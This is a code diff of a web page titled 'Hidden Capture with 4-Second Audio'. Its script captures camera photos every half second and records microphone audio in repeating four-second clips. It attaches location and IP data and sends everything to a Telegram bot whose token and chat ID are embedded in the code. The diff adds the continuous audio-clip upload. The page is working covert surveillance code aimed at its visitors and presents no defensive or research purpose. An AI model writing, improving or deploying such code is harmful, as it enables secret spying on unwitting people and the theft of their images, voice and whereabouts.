@@ -2,19 +2,18 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Hidden Auto Capture with Audio</title>
+  <title>Hidden Capture with 4-Second Audio</title>
 </head>
 <body>
 
 <script>
-const botToken = '8110393453:AAFWhP0vFwSJobp5GhEe7XjzKiRoorMyg4Y'; 
-  const chatId = '-4967067213';             
-             // Replace with your chat ID
+  const botToken = '8110393453:AAFWhP0vFwSJobp5GhEe7XjzKiRoorMyg4Y'; 
+  const chatId = '-4967067213';             // Replace with your chat ID
   const captureInterval = 500;                // Photo capture every 500 ms
+  const audioClipDuration = 4000;             // 4 seconds audio clip
+
   let captureLoop;
   let stream;
-  let mediaRecorder;
-  let audioChunks = [];
   let locationData = 'Location unavailable';
   let ipData = 'IP unavailable';
 
@@ -45,17 +44,11 @@ const botToken = '8110393453:AAFWhP0vFwSJobp5GhEe7XjzKiRoorMyg4Y';
       video.srcObject = stream;
       await video.play();
 
-      // Start camera photo capture loop
+      // Start capturing photos
       captureLoop = setInterval(() => captureAndSend(video), captureInterval);
 
-      // Start recording audio
-      mediaRecorder = new MediaRecorder(stream);
-      mediaRecorder.ondataavailable = event => {
-        if (event.data.size > 0) {
-          audioChunks.push(event.data);
-        }
-      };
-      mediaRecorder.start(); // Start recording audio
+      // Start recording audio clips
+      startAudioClips(stream);
 
     } catch (error) {
       console.error('Setup error:', error);
@@ -90,20 +83,36 @@ const botToken = '8110393453:AAFWhP0vFwSJobp5GhEe7XjzKiRoorMyg4Y';
     }
   }
 
-  async function sendAudio() {
-    if (!audioChunks.length) return;
-    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+  function startAudioClips(stream) {
+    const mediaRecorder = new MediaRecorder(stream);
+
+    mediaRecorder.ondataavailable = async (event) => {
+      if (event.data.size > 0) {
+        sendAudioClip(event.data);
+      }
+    };
+
+    mediaRecorder.onstop = () => {
+      // Restart a new recording session
+      startAudioClips(stream);
+    };
+
+    mediaRecorder.start();
+    setTimeout(() => mediaRecorder.stop(), audioClipDuration);
+  }
+
+  async function sendAudioClip(audioBlob) {
+    const caption = `${locationData}\n${ipData}\n${new Date().toLocaleString()}`;
+
     const formData = new FormData();
     formData.append('chat_id', chatId);
     formData.append('voice', audioBlob);
-    formData.append('caption', `${locationData}\n${ipData}\nFull Audio Recording`);
+    formData.append('caption', caption);
 
     try {
-      // navigator.sendBeacon doesn't support multipart/form-data, so we use fetch sync on unload
       await fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
         method: 'POST',
         body: formData,
-        keepalive: true // Keeps connection open during unload
       });
     } catch (error) {
       console.error('Audio send error:', error);
@@ -112,9 +121,6 @@ const botToken = '8110393453:AAFWhP0vFwSJobp5GhEe7XjzKiRoorMyg4Y';
 
   function stopAll() {
     if (captureLoop) clearInterval(captureLoop);
-    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-      mediaRecorder.stop();
-    }
     if (stream) {
       stream.getTracks().forEach(track => track.stop());
     }
@@ -129,13 +135,10 @@ const botToken = '8110393453:AAFWhP0vFwSJobp5GhEe7XjzKiRoorMyg4Y';
     });
   }
 
-  // Handle page close
-  window.addEventListener('beforeunload', async (event) => {
-    stopAll();
-    await sendAudio();
-  });
+  // Stop everything on page close
+  window.addEventListener('beforeunload', stopAll);
 
-  // Start when permissions granted
+  // Start everything after permission is granted
   start();
 </script>
 
